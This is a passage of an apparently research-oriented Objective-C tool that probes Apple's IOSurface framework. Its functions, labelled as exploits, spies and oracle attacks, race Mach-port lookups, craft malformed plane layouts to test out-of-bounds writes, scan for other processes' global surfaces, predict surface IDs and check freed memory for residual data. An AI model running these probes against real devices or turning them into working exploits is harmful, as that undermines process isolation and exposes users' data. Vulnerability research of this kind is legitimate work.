                                    if (fid != raceID) atomic_fetch_add(&wrongLookups, 1);
                                    CFRelease(found);
                                }
                                atomic_fetch_add(&totalOps, 1);
                            }
                        });
                    }

                    for (int t = 0; t < 10; t++) {
                        dispatch_group_async(grp, q, ^{
                            while (atomic_load(&running)) {
                                mach_port_t p = createPort(raceSurf);
                                if (p == MACH_PORT_NULL) {
                                    atomic_fetch_add(&nullPorts, 1);
                                } else {
                                    mach_port_deallocate(mach_task_self(), p);
                                }
                                atomic_fetch_add(&totalOps, 1);
                            }
                        });
                    }

                    for (int t = 0; t < 10; t++) {
                        dispatch_group_async(grp, q, ^{
                            while (atomic_load(&running)) {
                                if (racePort != MACH_PORT_NULL) {
                                    IOSurfaceRef found = lookupPort(racePort);
                                    if (found) {
                                        IOSurfaceID fid = sym.getID(found);
                                        if (fid != raceID) atomic_fetch_add(&wrongLookups, 1);
                                        CFRelease(found);
                                    }
                                }
                                atomic_fetch_add(&totalOps, 1);
                            }
                        });
                    }

                    for (int t = 0; t < 10; t++) {
                        dispatch_group_async(grp, q, ^{
                            while (atomic_load(&running)) {
                                IOSurfaceRef tmp = sym.create((__bridge CFDictionaryRef)
                                    isr_default_surface_params(8, 8));
                                if (tmp) CFRelease(tmp);
                                atomic_fetch_add(&totalOps, 1);
                            }
                        });
                    }

                    for (int t = 0; t < 10; t++) {
                        dispatch_group_async(grp, q, ^{
                            while (atomic_load(&running)) {
                                if (copyAllValues) {
                                    CFDictionaryRef all = copyAllValues(raceSurf);
                                    if (all) CFRelease(all);
                                }
                                atomic_fetch_add(&totalOps, 1);
                            }
                        });
                    }

                    usleep(200000);
                    atomic_store(&running, false);
                    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

                    uint32_t wrong = atomic_load(&wrongLookups);
                    uint32_t nullP = atomic_load(&nullPorts);
                    uint32_t ops = atomic_load(&totalOps);

                    log([NSString stringWithFormat:
                        @"PORTRACE: Race done — %u ops, %u wrong lookups, %u null ports",
                        ops, wrong, nullP]);

                    if (wrong > 0) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"PORTRACE: ANOMALY — %u lookups returned wrong surface during race!", wrong]);
                    }
                    if (nullP > 0) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"PORTRACE: ANOMALY — %u CreateMachPort calls returned NULL on valid surface!", nullP]);
                    }

                    if (racePort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), racePort);
                    CFRelease(raceSurf);
                }
            }

            // Phase D — ID prediction and preemptive lookup
            if (!isr_stopped()) {
                log(@"PORTRACE: Phase D — ID prediction and preemptive lookup");

                IOSurfaceID ids[20];
                for (int i = 0; i < 20; i++) {
                    IOSurfaceRef tmp = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(8, 8));
                    if (tmp) {
                        ids[i] = sym.getID(tmp);
                        CFRelease(tmp);
                    } else {
                        ids[i] = 0;
                    }
                }

                BOOL sequential = YES;
                int32_t delta = 0;
                uint32_t reuseCount = 0;
                for (int i = 1; i < 20; i++) {
                    if (ids[i] == 0 || ids[i-1] == 0) continue;
                    int32_t d = (int32_t)ids[i] - (int32_t)ids[i-1];
                    if (i == 1) {
                        delta = d;
                    } else if (d != delta) {
                        sequential = NO;
                    }
                    if (d <= 0) reuseCount++;
                }

                log([NSString stringWithFormat:
                    @"PORTRACE: ID pattern — sequential=%@ delta=%d reuse=%u range=[%u..%u]",
                    sequential ? @"YES" : @"NO", delta, reuseCount, ids[0], ids[19]]);

                IOSurfaceID predicted = ids[19] + (uint32_t)delta;
                log([NSString stringWithFormat:@"PORTRACE: Predicted next ID = %u", predicted]);

                IOSurfaceRef preempt = sym.lookup(predicted);
                if (preempt) {
                    anomalies++;
                    IOSurfaceID preemptID = sym.getID(preempt);
                    log([NSString stringWithFormat:
                        @"PORTRACE: ANOMALY — preemptive lookup for %u succeeded (got id=%u)!",
                        predicted, preemptID]);
                    CFRelease(preempt);
                } else {
                    log([NSString stringWithFormat:
                        @"PORTRACE: Preemptive lookup for %u returned NULL (correct)", predicted]);
                }

                IOSurfaceRef next = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(8, 8));
                if (next) {
                    IOSurfaceID actualNext = sym.getID(next);
                    BOOL matched = (actualNext == predicted);
                    log([NSString stringWithFormat:
                        @"PORTRACE: Actual next ID = %u, predicted = %u — %@",
                        actualNext, predicted, matched ? @"PREDICTED CORRECTLY" : @"MISMATCH"]);
                    if (matched) {
                        anomalies++;
                        log(@"PORTRACE: ANOMALY — ID allocation is fully predictable!");
                    }
                    CFRelease(next);
                }

                IOSurfaceRef reuse1 = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(8, 8));
                if (reuse1) {
                    IOSurfaceID idN = sym.getID(reuse1);
                    CFRelease(reuse1);
                    IOSurfaceRef reuse2 = sym.create((__bridge CFDictionaryRef)isr_default_surface_params(8, 8));
                    if (reuse2) {
                        IOSurfaceID idAfter = sym.getID(reuse2);
                        if (idAfter == idN) {
                            log([NSString stringWithFormat:@"PORTRACE: ID %u was REUSED immediately", idN]);
                        } else {
                            log([NSString stringWithFormat:
                                @"PORTRACE: ID %u -> %u (delta=%d, no immediate reuse)",
                                idN, idAfter, (int32_t)(idAfter - idN)]);
                        }
                        CFRelease(reuse2);
                    }
                }
            }

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PORTRACE: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-PortRace-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 25: Phantom Plane Exploit

void iosurface_research_phantom_plane(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"PHANTOM: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"PHANTOM: Starting phantom plane exploit");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef size_t (*ISR_PlaneCountFn)(IOSurfaceRef);
            typedef void * (*ISR_PlaneBaseFn)(IOSurfaceRef, size_t);
            typedef size_t (*ISR_PlaneDimFn)(IOSurfaceRef, size_t);
            ISR_PlaneCountFn getPlaneCount = (ISR_PlaneCountFn)dlsym(sym.iosurface, "IOSurfaceGetPlaneCount");
            ISR_PlaneBaseFn getPlaneBase = (ISR_PlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");
            ISR_PlaneDimFn getPlaneBPR = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetBytesPerRowOfPlane");
            ISR_PlaneDimFn getPlaneW = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetWidthOfPlane");
            ISR_PlaneDimFn getPlaneH = (ISR_PlaneDimFn)dlsym(sym.iosurface, "IOSurfaceGetHeightOfPlane");

            if (!getPlaneCount || !getPlaneBase) {
                log(@"PHANTOM: Missing plane functions");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            // Phase A — BGRA with 2 planes (phantom plane write)
            log(@"PHANTOM: Phase A — BGRA with phantom second plane");
            NSDictionary *plane0 = @{
                @"IOSurfacePlaneWidth": @64,
                @"IOSurfacePlaneHeight": @64,
                @"IOSurfacePlaneBytesPerElement": @4,
                @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *plane1 = @{
                @"IOSurfacePlaneWidth": @64,
                @"IOSurfacePlaneHeight": @32,
                @"IOSurfacePlaneBytesPerElement": @4,
                @"IOSurfacePlaneOffset": @16384,
                @"IOSurfacePlaneBytesPerRow": @256
            };
            NSDictionary *bgraParams = @{
                @"IOSurfaceWidth": @64,
                @"IOSurfaceHeight": @64,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @256,
                @"IOSurfaceAllocSize": @(16384 + 8192),
                @"IOSurfacePlaneInfo": @[plane0, plane1]
            };

            IOSurfaceRef bgraSurf = sym.create((__bridge CFDictionaryRef)bgraParams);
            if (bgraSurf) {
                size_t pc = getPlaneCount(bgraSurf);
                log([NSString stringWithFormat:@"PHANTOM: BGRA+2planes created, planeCount=%zu allocSize=%zu",
                     pc, sym.getAllocSize(bgraSurf)]);

                sym.lock(bgraSurf, 0, NULL);
                void *p0base = getPlaneBase(bgraSurf, 0);
                void *p1base = getPlaneBase(bgraSurf, 1);

                if (p0base && p1base) {
                    memset(p0base, 0xAA, 16384);
                    memset(p1base, 0xBB, 8192);

                    uint8_t *p0check = (uint8_t *)p0base;
                    uint8_t *p1check = (uint8_t *)p1base;
                    BOOL p0ok = (p0check[0] == 0xAA && p0check[16383] == 0xAA);
                    BOOL p1ok = (p1check[0] == 0xBB && p1check[8191] == 0xBB);
                    log([NSString stringWithFormat:@"PHANTOM: Plane0 write OK=%d, Plane1 write OK=%d", p0ok, p1ok]);

                    if (p0check[16383] == 0xBB) {
                        anomalies++;
                        log(@"PHANTOM: ANOMALY — plane 1 write corrupted end of plane 0!");
                    }

                    // CG render test: create context from plane 0 base, see if CG sees only plane 0
                    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
                    CGContextRef ctx = CGBitmapContextCreate(p0base, 64, 64, 8, 256,
                        cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                    if (ctx) {
                        CGImageRef img = CGBitmapContextCreateImage(ctx);
                        if (img) {
                            size_t imgW = CGImageGetWidth(img);
                            size_t imgH = CGImageGetHeight(img);
                            log([NSString stringWithFormat:@"PHANTOM: CG render from plane0 — %zux%zu", imgW, imgH]);
                            CGImageRelease(img);
                        }
                        CGContextRelease(ctx);
                    }
                    CGColorSpaceRelease(cs);
                } else {
                    log([NSString stringWithFormat:@"PHANTOM: Plane bases — p0=%p p1=%p", p0base, p1base]);
                }
                sym.unlock(bgraSurf, 0, NULL);
                CFRelease(bgraSurf);
            } else {
                log(@"PHANTOM: Kernel rejected BGRA+2planes");
            }

            if (isr_stopped()) goto phantom_done;

            // Phase B — 420v with 3 planes (extra chroma phantom)
            log(@"PHANTOM: Phase B — 420v with phantom third plane");
            {
                NSDictionary *yPlane = @{
                    @"IOSurfacePlaneWidth": @64, @"IOSurfacePlaneHeight": @64,
                    @"IOSurfacePlaneBytesPerElement": @1, @"IOSurfacePlaneOffset": @0,
                    @"IOSurfacePlaneBytesPerRow": @64
                };
                NSDictionary *cbcrPlane = @{
                    @"IOSurfacePlaneWidth": @32, @"IOSurfacePlaneHeight": @32,
                    @"IOSurfacePlaneBytesPerElement": @2, @"IOSurfacePlaneOffset": @4096,
                    @"IOSurfacePlaneBytesPerRow": @64
                };
                NSDictionary *phantomPlane = @{
                    @"IOSurfacePlaneWidth": @32, @"IOSurfacePlaneHeight": @32,
                    @"IOSurfacePlaneBytesPerElement": @1, @"IOSurfacePlaneOffset": @6144,
                    @"IOSurfacePlaneBytesPerRow": @32
                };
                NSDictionary *yuvParams = @{
                    @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
                    @"IOSurfacePixelFormat": @(0x34323076), // '420v'
                    @"IOSurfaceBytesPerElement": @1,
                    @"IOSurfaceBytesPerRow": @64,
                    @"IOSurfaceAllocSize": @(7168),
                    @"IOSurfacePlaneInfo": @[yPlane, cbcrPlane, phantomPlane]
                };

                IOSurfaceRef yuvSurf = sym.create((__bridge CFDictionaryRef)yuvParams);
                if (yuvSurf) {
                    size_t pc = getPlaneCount(yuvSurf);
                    size_t allocSz = sym.getAllocSize(yuvSurf);
                    log([NSString stringWithFormat:@"PHANTOM: 420v+3planes created — planes=%zu alloc=%zu", pc, allocSz]);

                    sym.lock(yuvSurf, 0, NULL);
                    void *phantomBase = getPlaneBase(yuvSurf, 2);
                    void *yBase = getPlaneBase(yuvSurf, 0);
                    if (phantomBase && yBase) {
                        memset(phantomBase, 0xDD, 1024);
                        uint8_t *scanBase = (uint8_t *)yBase;
                        BOOL foundDD = NO;
                        for (size_t i = 6144; i < allocSz && i < 7168; i++) {
                            if (scanBase[i] == 0xDD) { foundDD = YES; break; }
                        }
                        if (foundDD) {
                            anomalies++;
                            log(@"PHANTOM: ANOMALY — phantom plane data accessible within allocSize bounds!");
                        } else {
                            log(@"PHANTOM: Phantom plane data not found via linear scan");
                        }
                    } else {
                        log([NSString stringWithFormat:@"PHANTOM: Plane bases — y=%p phantom=%p", yBase, phantomBase]);
                    }
                    sym.unlock(yuvSurf, 0, NULL);
                    CFRelease(yuvSurf);
                } else {
                    log(@"PHANTOM: Kernel rejected 420v+3planes");
                }
            }

            if (isr_stopped()) goto phantom_done;

            // Phase C — Plane boundary overwrite
            log(@"PHANTOM: Phase C — plane boundary overwrite test");
            {
                IOSurfaceRef bSurf = sym.create((__bridge CFDictionaryRef)bgraParams);
                if (bSurf) {
                    sym.lock(bSurf, 0, NULL);
                    void *bp0 = getPlaneBase(bSurf, 0);
                    void *bp1 = getPlaneBase(bSurf, 1);
                    if (bp0 && bp1) {
                        memset(bp0, 0x00, 16384);
                        memset(bp1, 0x00, 8192);
                        // Write 0xFF to last 64 bytes of plane 0
                        memset((uint8_t *)bp0 + 16384 - 64, 0xFF, 64);
                        // Read first 64 bytes of plane 1
                        uint8_t *p1start = (uint8_t *)bp1;
                        int crossCount = 0;
                        for (int i = 0; i < 64; i++) {
                            if (p1start[i] == 0xFF) crossCount++;
                        }
                        if (crossCount > 0) {
                            anomalies++;
                            log([NSString stringWithFormat:
                                @"PHANTOM: ANOMALY — %d/64 bytes leaked from plane 0 end to plane 1 start!", crossCount]);
                        } else {
                            ptrdiff_t gap = (uint8_t *)bp1 - (uint8_t *)bp0;
                            log([NSString stringWithFormat:
                                @"PHANTOM: No cross-plane leak — plane gap=%td bytes (offset diff=16384)", gap]);
                            if (gap == 16384) {
                                log(@"PHANTOM: Planes are CONTIGUOUS in memory — writes at boundary adjacent");
                                anomalies++;
                            }
                        }
                    }
                    sym.unlock(bSurf, 0, NULL);
                    CFRelease(bSurf);
                }
            }

            if (isr_stopped()) goto phantom_done;

            // Phase D — Render confusion: CG context that overflows plane 0 into plane 1
            log(@"PHANTOM: Phase D — render overflow into phantom plane");
            {
                IOSurfaceRef dSurf = sym.create((__bridge CFDictionaryRef)bgraParams);
                if (dSurf) {
                    sym.lock(dSurf, 0, NULL);
                    void *dp0 = getPlaneBase(dSurf, 0);
                    void *dp1 = getPlaneBase(dSurf, 1);
                    if (dp0 && dp1) {
                        // Fill plane 0 with red (BGRA = 0x00,0x00,0xFF,0xFF)
                        uint32_t red = 0xFF0000FF;
                        uint32_t green = 0x00FF00FF;
                        uint32_t *p0px = (uint32_t *)dp0;
                        for (int i = 0; i < 64*64; i++) p0px[i] = red;
                        uint32_t *p1px = (uint32_t *)dp1;
                        for (int i = 0; i < 64*32; i++) p1px[i] = green;

                        // Create CG context spanning 96 rows (64 plane0 + 32 into plane1)
                        ptrdiff_t gap = (uint8_t *)dp1 - (uint8_t *)dp0;
                        if (gap == 16384) {
                            CGColorSpaceRef cs2 = CGColorSpaceCreateDeviceRGB();
                            CGContextRef ctx2 = CGBitmapContextCreate(dp0, 64, 96, 8, 256,
                                cs2, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
                            if (ctx2) {
                                CGImageRef img2 = CGBitmapContextCreateImage(ctx2);
                                if (img2) {
                                    // Read pixel at row 65 (0-indexed), which should be in plane 1 zone
                                    CFDataRef pixData = CGDataProviderCopyData(CGImageGetDataProvider(img2));
                                    if (pixData) {
                                        const uint8_t *bytes = CFDataGetBytePtr(pixData);
                                        size_t bpr = CGImageGetBytesPerRow(img2);
                                        // Row 65, col 0 offset
                                        size_t off = 65 * bpr;
                                        if (off + 4 <= (size_t)CFDataGetLength(pixData)) {
                                            uint32_t pxVal;
                                            memcpy(&pxVal, bytes + off, 4);
                                            log([NSString stringWithFormat:
                                                @"PHANTOM: Row 65 pixel = 0x%08X (green=0x00FF00FF)", pxVal]);
                                            if (pxVal == green) {
                                                anomalies++;
                                                log(@"PHANTOM: ANOMALY — CG rendered plane 1 data via overflow context!");
                                            } else if (pxVal != 0 && pxVal != red) {
                                                anomalies++;
                                                log(@"PHANTOM: ANOMALY — unexpected pixel data in overflow region!");
                                            }
                                        }
                                        CFRelease(pixData);
                                    }
                                    CGImageRelease(img2);
                                }
                                CGContextRelease(ctx2);
                            } else {
                                log(@"PHANTOM: CG rejected oversized context creation");
                            }
                            CGColorSpaceRelease(cs2);
                        } else {
                            log([NSString stringWithFormat:@"PHANTOM: Planes not contiguous (gap=%td), skip overflow test", gap]);
                        }
                    }
                    sym.unlock(dSurf, 0, NULL);
                    CFRelease(dSurf);
                }
            }

        phantom_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"PHANTOM: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-PhantomPlane-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 26: Global Surface Spy

void iosurface_research_global_spy(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"GLOBALSPY: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"GLOBALSPY: Starting global surface spy analysis");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;

            typedef void (*ISR_SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            typedef CFTypeRef (*ISR_CopyValueFn)(IOSurfaceRef, CFStringRef);
            ISR_SetValueFn setValue = (ISR_SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            ISR_CopyValueFn copyValue = (ISR_CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");

            if (!setValue) {
                log(@"GLOBALSPY: Missing IOSurfaceSetValue");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            // Phase A — Global surface creation and sentinel verification
            log(@"GLOBALSPY: Phase A — global surface with sentinel data");
            NSDictionary *params = isr_default_surface_params(64, 64);
            IOSurfaceRef surfA = sym.create((__bridge CFDictionaryRef)params);
            if (!surfA) {
                log(@"GLOBALSPY: Failed to create surface");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            IOSurfaceID idA = sym.getID(surfA);
            setValue(surfA, CFSTR("IOSurfaceIsGlobal"), (__bridge CFTypeRef)@YES);
            log([NSString stringWithFormat:@"GLOBALSPY: Created global surface id=%u", idA]);

            sym.lock(surfA, 0, NULL);
            void *baseA = sym.getBase(surfA);
            if (baseA) {
                uint32_t sentinel = 0xDEADBEEF;
                uint32_t *px = (uint32_t *)baseA;
                for (int i = 0; i < 64*64; i++) px[i] = sentinel;
            }
            sym.unlock(surfA, 0, NULL);

            IOSurfaceRef lookupA = sym.lookup(idA);
            if (lookupA) {
                sym.lock(lookupA, 0, NULL);
                void *lBase = sym.getBase(lookupA);
                if (lBase) {
                    uint32_t val = ((uint32_t *)lBase)[0];
                    log([NSString stringWithFormat:@"GLOBALSPY: Lookup OK — first word=0x%08X (expected 0xDEADBEEF)", val]);
                    if (val == 0xDEADBEEF) {
                        log(@"GLOBALSPY: Global surface sentinel verified via lookup");
                    }
                }
                sym.unlock(lookupA, 0, NULL);
                CFRelease(lookupA);
            } else {
                log(@"GLOBALSPY: Lookup failed — surface not globally visible");
            }

            if (isr_stopped()) goto globalspy_done;

            // Phase B — Global surface data tampering via second reference
            log(@"GLOBALSPY: Phase B — data tampering via second reference");
            {
                IOSurfaceRef refB = sym.lookup(idA);
                if (refB) {
                    sym.lock(refB, 0, NULL);
                    void *bBase = sym.getBase(refB);
                    if (bBase) {
                        uint32_t *bpx = (uint32_t *)bBase;
                        for (int i = 0; i < 64*64; i++) bpx[i] = 0xBBBBBBBB;
                    }
                    sym.unlock(refB, 0, NULL);

                    // Read through original reference A
                    sym.lock(surfA, 0, NULL);
                    void *aBase = sym.getBase(surfA);
                    if (aBase) {
                        uint32_t aVal = ((uint32_t *)aBase)[0];
                        log([NSString stringWithFormat:@"GLOBALSPY: Original ref reads 0x%08X after tamper via lookup ref", aVal]);
                        if (aVal == 0xBBBBBBBB) {
                            anomalies++;
                            log(@"GLOBALSPY: ANOMALY — data tampered! Lookup reference shares memory with creator");
                        }
                    }
                    sym.unlock(surfA, 0, NULL);
                    CFRelease(refB);
                }
            }

            if (isr_stopped()) goto globalspy_done;

            // Phase C — Global surface enumeration: scan for foreign surfaces
            log(@"GLOBALSPY: Phase C — scanning for foreign global surfaces");
            {
                // Create 10 global surfaces to establish our ID range
                IOSurfaceRef ourSurfs[10];
                IOSurfaceID ourIDs[10];
                for (int i = 0; i < 10; i++) {
                    ourSurfs[i] = sym.create((__bridge CFDictionaryRef)params);
                    if (ourSurfs[i]) {
                        ourIDs[i] = sym.getID(ourSurfs[i]);
                        setValue(ourSurfs[i], CFSTR("IOSurfaceIsGlobal"), (__bridge CFTypeRef)@YES);
                    } else {
                        ourIDs[i] = 0;
                    }
                }

                IOSurfaceID maxID = 0;
                for (int i = 0; i < 10; i++) {
                    if (ourIDs[i] > maxID) maxID = ourIDs[i];
                }

                uint32_t foreignCount = 0;
                uint32_t scanned = 0;
                for (IOSurfaceID probe = 1; probe <= maxID && !isr_stopped(); probe++) {
                    BOOL isOurs = NO;
                    if (probe == idA) isOurs = YES;
                    for (int i = 0; i < 10 && !isOurs; i++) {
                        if (probe == ourIDs[i]) isOurs = YES;
                    }
                    if (isOurs) continue;

                    scanned++;
                    IOSurfaceRef foreign = sym.lookup(probe);
                    if (foreign) {
                        foreignCount++;
                        size_t fw = sym.getWidth(foreign);
                        size_t fh = sym.getHeight(foreign);
                        size_t fa = sym.getAllocSize(foreign);
                        log([NSString stringWithFormat:
                            @"GLOBALSPY: FOREIGN surface id=%u %zux%zu alloc=%zu", probe, fw, fh, fa]);
                        CFRelease(foreign);
                    }
                }

                log([NSString stringWithFormat:@"GLOBALSPY: Scanned %u IDs, found %u foreign surfaces", scanned, foreignCount]);
                if (foreignCount > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:@"GLOBALSPY: ANOMALY — %u foreign global surfaces visible!", foreignCount]);
                }

                for (int i = 0; i < 10; i++) {
                    if (ourSurfs[i]) CFRelease(ourSurfs[i]);
                }
            }

            if (isr_stopped()) goto globalspy_done;

            // Phase D — Global surface + destroy race
            log(@"GLOBALSPY: Phase D — destroy race on global surface");
            {
                IOSurfaceRef raceSurf = sym.create((__bridge CFDictionaryRef)params);
                if (raceSurf) {
                    IOSurfaceID raceID = sym.getID(raceSurf);
                    setValue(raceSurf, CFSTR("IOSurfaceIsGlobal"), (__bridge CFTypeRef)@YES);

                    // Write known dimensions
                    sym.lock(raceSurf, 0, NULL);
                    void *rBase = sym.getBase(raceSurf);
                    if (rBase) memset(rBase, 0xEE, 64 * 64 * 4);
                    sym.unlock(raceSurf, 0, NULL);

                    __block atomic_uint postDestroyLookups = 0;
                    __block atomic_uint wrongDimLookups = 0;
                    __block atomic_bool destroyed = false;

                    dispatch_group_t grp = dispatch_group_create();

                    // Thread 1: destroy after 1ms
                    dispatch_group_async(grp, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
                        usleep(1000);
                        CFRelease(raceSurf);
                        atomic_store(&destroyed, true);
                    });

                    // Thread 2: rapid lookups
                    dispatch_group_async(grp, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
                        uint64_t deadline = mach_absolute_time() + 50000000; // ~50ms
                        while (mach_absolute_time() < deadline) {
                            IOSurfaceRef lr = sym.lookup(raceID);
                            if (lr) {
                                if (atomic_load(&destroyed)) {
                                    atomic_fetch_add(&postDestroyLookups, 1);
                                    size_t w = sym.getWidth(lr);
                                    if (w != 64) {
                                        atomic_fetch_add(&wrongDimLookups, 1);
                                    }
                                }
                                CFRelease(lr);
                            }
                        }
                    });

                    dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

                    uint32_t pdl = atomic_load(&postDestroyLookups);
                    uint32_t wdl = atomic_load(&wrongDimLookups);
                    log([NSString stringWithFormat:
                        @"GLOBALSPY: Post-destroy lookups=%u, wrong dimensions=%u", pdl, wdl]);
                    if (pdl > 0) {
                        anomalies++;
                        log([NSString stringWithFormat:
                            @"GLOBALSPY: ANOMALY — %u lookups succeeded after surface destroyed!", pdl]);
                    }
                    if (wdl > 0) {
                        anomalies++;
                        log(@"GLOBALSPY: ANOMALY — confused lookup returned surface with wrong dimensions!");
                    }
                }
            }

        globalspy_done:;
            CFRelease(surfA);
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"GLOBALSPY: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);

            NSDictionary *results = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-GlobalSpy-checkpoint.json", results);
            isr_unload(&sym);
            done(results);
        }
    });
}

#pragma mark - Probe 27: ID Oracle Attack

void iosurface_research_id_oracle(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                log(@"IDORACLE: Failed to load symbols");
                done(@{@"status": @"ERROR", @"anomalies": @0});
                return;
            }

            log(@"IDORACLE: Starting ID oracle attack");
            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            uint32_t anomalies = 0;
            NSDictionary *params = isr_default_surface_params(64, 64);

            // Phase A — ID prediction accuracy
            log(@"IDORACLE: Phase A — ID prediction accuracy test");
            {
                IOSurfaceID ids[50];
                for (int i = 0; i < 50; i++) {
                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
                    if (s) {
                        ids[i] = sym.getID(s);
                        CFRelease(s);
                    } else {
                        ids[i] = 0;
                    }
                }

                // Determine pattern: check if sequential
                int32_t delta = (int32_t)ids[1] - (int32_t)ids[0];
                BOOL consistent = YES;
                for (int i = 2; i < 50; i++) {
                    int32_t d = (int32_t)ids[i] - (int32_t)ids[i-1];
                    if (d != delta) { consistent = NO; break; }
                }

                IOSurfaceID lastID = ids[49];
                uint32_t correct = 0;
                for (int i = 0; i < 20 && !isr_stopped(); i++) {
                    IOSurfaceID predicted = lastID + delta;
                    IOSurfaceRef s = sym.create((__bridge CFDictionaryRef)params);
                    if (s) {
                        IOSurfaceID actual = sym.getID(s);
                        if (actual == predicted) correct++;
                        lastID = actual;
                        CFRelease(s);
                    }
                }

                double accuracy = correct / 20.0 * 100.0;
                log([NSString stringWithFormat:@"IDORACLE: Prediction accuracy = %u/20 (%.0f%%) delta=%d consistent=%d",
                     correct, accuracy, delta, consistent]);
                if (accuracy > 90.0) {
                    anomalies++;
                    log(@"IDORACLE: ANOMALY — ID allocation is >90%% predictable!");
                }
            }

            if (isr_stopped()) goto idoracle_done;

            // Phase B — Pre-lookup reservation and residual data attack
            log(@"IDORACLE: Phase B — residual data after ID reuse");
            {
                // Get current ID baseline
                IOSurfaceRef baseline = sym.create((__bridge CFDictionaryRef)params);
                IOSurfaceID baseID = sym.getID(baseline);
                CFRelease(baseline);

                IOSurfaceID predictedN = baseID + 1;
                // Pre-lookup should fail
                IOSurfaceRef preLookup = sym.lookup(predictedN);
                log([NSString stringWithFormat:@"IDORACLE: Pre-lookup ID %u = %s",
                     predictedN, preLookup ? "EXISTS (unexpected!)" : "NULL (correct)"]);
                if (preLookup) CFRelease(preLookup);

                // Create surface at predicted ID
                IOSurfaceRef surfN = sym.create((__bridge CFDictionaryRef)params);
                IOSurfaceID actualN = sym.getID(surfN);
                log([NSString stringWithFormat:@"IDORACLE: Predicted=%u actual=%u match=%s",
                     predictedN, actualN, actualN == predictedN ? "YES" : "NO"]);

                // Write sentinel and destroy
                sym.lock(surfN, 0, NULL);
                void *nBase = sym.getBase(surfN);
                if (nBase) {
                    uint32_t *npx = (uint32_t *)nBase;
                    for (int i = 0; i < 64*64; i++) npx[i] = 0xAAAAAAAA;
                }
                sym.unlock(surfN, 0, NULL);
                CFRelease(surfN);

                // Create new surface — check if same ID and if residual data persists
                IOSurfaceRef surfN2 = sym.create((__bridge CFDictionaryRef)params);
                IOSurfaceID idN2 = sym.getID(surfN2);
                log([NSString stringWithFormat:@"IDORACLE: After destroy+create — new ID=%u (reused=%s)",
                     idN2, idN2 == actualN ? "YES" : "NO"]);

                sym.lock(surfN2, 0, NULL);
                void *n2Base = sym.getBase(surfN2);
                if (n2Base) {
                    uint32_t *n2px = (uint32_t *)n2Base;
                    int residualCount = 0;
                    for (int i = 0; i < 64*64; i++) {
                        if (n2px[i] == 0xAAAAAAAA) residualCount++;
                    }
